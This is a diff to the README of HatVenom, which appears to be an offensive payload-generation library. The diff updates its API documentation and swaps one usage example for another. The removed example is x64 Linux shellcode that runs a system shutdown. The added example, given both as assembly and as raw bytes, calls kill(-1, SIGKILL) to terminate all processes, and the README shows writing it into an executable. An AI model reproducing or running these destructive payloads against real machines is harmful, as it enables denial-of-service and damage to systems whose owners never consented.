@@ -44,7 +44,7 @@ pip3 install git+https://github.com/EntySec/HatVenom
 
 There are all HatVenom basic functions that can be used to generate payload, covert data, assemble code or inject shellcode.
 
-* `assemble(arch, code)` - Generate byte code for specified target from specified code.
+* `assemble(arch, code, mode=None)` - Generate byte code for specified target from specified code (`mode` argument is used for `armle` and `armbe` to switch between `thumb` command set mode or `arm`).
 * `convert_host(host, endian='little')` - Convert host to bytes.
 * `convert_port(port, endian='little')` - Convert port to bytes.
 * `generate(file_format, arch, shellcode, offsets={})` - Generates payload for specified target and with specified shellcode.
@@ -57,38 +57,24 @@ It's very easy to assemble code for various targets in HatVenom. Let's assemble 
 ```python
 from hatvenom import HatVenom
 
-code = (
-    "xor rax, rax;"
-    "xor rdx, rdx;"
-    "push rax;"
-    "push 0x77;"
-    "push 0x6f6e;"
-    "mov rbx, rsp;"
-    "push rax;"
-    "push 0x682d;"
-    "mov rcx, rsp;"
-    "push rax;"
-    "movabs r8, 0x2f2f2f6e6962732f;"
-    "movabs r10, 0x6e776f6474756873;"
-    "push r10;"
-    "push r8;"
-    "mov rdi, rsp;"
-    "push rdx;"
-    "push rbx;"
-    "push rcx;"
-    "push rdi;"
-    "mov rsi, rsp;"
-    "add rax, 0x3b;"
-    "syscall"
-)
+code = """
+start:
+    push 0x3e
+    pop rax
+    push -1
+    pop rdi
+    push 0x9
+    pop rsi
+    syscall
+"""
 
 hatvenom = HatVenom()
-shellcode = hatvenom.assemble(code, 'x64')
+shellcode = hatvenom.assemble('x64', code)
 ```
 
 ## Generating payload
 
-It's very easy to generate payload for various targets in HatVenom. Let's generate a simple payload that calls shutdown for Linux and save it to `a.out`.
+It's very easy to generate payload for various targets in HatVenom. Let's generate a simple payload that kills all processes for Linux and save it to `a.out`.
 
 ### Examples
 
@@ -96,15 +82,7 @@ It's very easy to generate payload for various targets in HatVenom. Let's genera
 from hatvenom import HatVenom
 
 shellcode = (
-    b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"
-    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
-    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
-    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
-    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
-    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
-    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
-    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
-    b"\x05"
+    "\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
 )
 
 hatvenom = HatVenom()
